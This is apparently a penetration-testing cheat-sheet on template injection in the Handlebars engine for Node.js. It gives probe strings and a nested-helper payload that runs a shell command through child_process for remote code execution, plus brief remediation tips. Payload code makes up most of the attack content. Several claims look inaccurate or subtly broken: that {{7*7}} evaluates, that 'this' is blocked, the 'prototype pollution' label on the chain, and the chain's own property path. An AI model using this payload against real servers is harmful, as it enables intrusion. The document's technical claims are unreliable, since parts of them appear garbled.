# Handlebars / Mustache — Node.js Template Engine

## Summary
Handlebars is a logic-constrained template engine for Node.js. SSTI here is more limited due to intentional design.

## Identification
```handlebars
{{7*7}}       → 49       (if math evaluates)
{{7*'7'}}     → 49       (JS coercion)
{{constructor}} → undefined (blocked by default)
```

## Limitations
Handlebars intentionally blocks `constructor`, `__proto__`, `prototype`, and `this`. Basic math evaluation may work, but RCE requires prototype pollution or a vulnerable helper.

## Basic Confirmation
```handlebars
{{7*7}}
{{lookup this 'constructor'}}  (if lookup helper is available)
```

## Prototype Pollution → RCE

```handlebars
# Step 1: Check if prototype pollution is possible
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.split "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.split.substring.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## If Custom Helpers Exist
```handlebars
{{#each helper "id"}}
{{#if (helper "id")}}
```

## Remediation
- Handlebars SSTI is rare without prototype pollution
- Keep Handlebars updated
- Avoid custom helpers that evaluate arbitrary code
- Pre-compile templates server-side
